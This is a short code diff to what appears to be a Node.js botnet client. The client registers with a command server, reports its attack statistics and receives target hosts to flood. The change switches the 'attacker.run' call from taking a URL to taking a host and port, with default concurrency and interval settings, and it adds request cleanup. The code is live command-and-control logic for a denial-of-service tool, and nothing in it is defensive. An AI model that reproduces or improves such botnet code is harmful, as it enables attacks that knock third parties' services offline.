@@ -27,11 +27,12 @@ const sendUpdate = () => {
         }
 
         const url = `${process.env.CMD_URL}api/control/register`;
-        request.post({
+        const req = request.post({
             url,
             json: true,
             body: { botUrl: process.env.URL, loop: stats.loop, success: stats.success, error: stats.error }
         }, (err, res) => {
+            req.destroy();
             if(err) {
                 console.error(err);
                 return;
@@ -40,8 +41,8 @@ const sendUpdate = () => {
                 attacker.stop();
                 console.log(`Attack stopped`);
             } else if(!stats.isRun && res.body.target) {
-                attacker.run(res.body.target.url, res.body.target.concurrency || 100, res.body.target.interval || 1000);
-                console.log(`Attack started for ${res.body.target.url}`);
+                attacker.run(res.body.target.host, res.body.target.port, res.body.target.concurrency || 100, res.body.target.interval || 1000);
+                console.log(`Attack started for ${res.body.target.host}:${res.body.target.port}`);
             }
         });
     } catch(err) {
